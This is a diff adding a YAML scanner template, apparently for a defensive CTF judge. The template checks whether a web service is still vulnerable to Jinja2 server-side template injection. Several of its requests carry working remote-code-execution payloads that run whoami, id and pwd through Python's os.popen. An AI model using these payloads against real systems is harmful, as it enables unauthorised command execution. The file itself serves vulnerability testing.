@@ -1,0 +1,73 @@
+id: vuln-check
+
+info:
+  name: Vulnerability checker
+  author: Sythnog
+  severity: high
+  description: This test is used to see if the vulnerability still exists by actively exploiting it
+  tags: defensive-ctf, vulnerable-functionality
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/%7B%7B21*2%7D%7D"
+    skip-variables-check: true
+    redirects: false
+    headers:
+      User-Agent: "Defensive CTF Judge"
+
+    matchers:
+    - type: word
+      words:
+        - "42"
+  - method: GET
+    path:
+      - "{{RootURL}}/%7B%7Brequest%5B%27application%27%5D%5B%27%5F%5Fglobals%5F%5F%27%5D%5B%27%5F%5Fbuiltins%5F%5F%27%5D%5B%27%5F%5Fimport%5F%5F%27%5D%28%27os%27%29%5B%27popen%27%5D%28%27whoami%27%29%5B%27read%27%5D%28%29%7D%7D"
+    skip-variables-check: true
+    redirects: false
+    headers:
+      User-Agent: "Defensive CTF Judge"
+
+    matchers:
+    - type: word
+      words:
+        - "root"
+
+  - method: GET
+    path:
+      - "{{RootURL}}/%7B%7B%27pwned%20%27%2A3%7D%7D"
+    skip-variables-check: true
+    redirects: false
+    headers:
+      User-Agent: "Defensive CTF Judge"
+
+    matchers:
+    - type: word
+      words:
+        - "pwned pwned pwned"
+
+  - method: GET
+    path:
+      - "{{RootURL}}/%7B%7Brequest%5B%27application%27%5D%5B%27%5F%5Fglobals%5F%5F%27%5D%5B%27%5F%5Fbuiltins%5F%5F%27%5D%5B%27%5F%5Fimport%5F%5F%27%5D%28%27os%27%29%5B%27popen%27%5D%28%27id%27%29%5B%27read%27%5D%28%29%7D%7D"
+    skip-variables-check: true
+    redirects: false
+    headers:
+      User-Agent: "Defensive CTF Judge"
+
+    matchers:
+    - type: word
+      words:
+        - "uid"
+
+  - method: GET
+    path:
+      - "{{RootURL}}/%7B%7Brequest%5B%27application%27%5D%5B%27%5F%5Fglobals%5F%5F%27%5D%5B%27%5F%5Fbuiltins%5F%5F%27%5D%5B%27%5F%5Fimport%5F%5F%27%5D%28%27os%27%29%5B%27popen%27%5D%28%27pwd%27%29%5B%27read%27%5D%28%29%7D%7D"
+    skip-variables-check: true
+    redirects: false
+    headers:
+      User-Agent: "Defensive CTF Judge"
+
+    matchers:
+    - type: word
+      words:
+        - "opt"
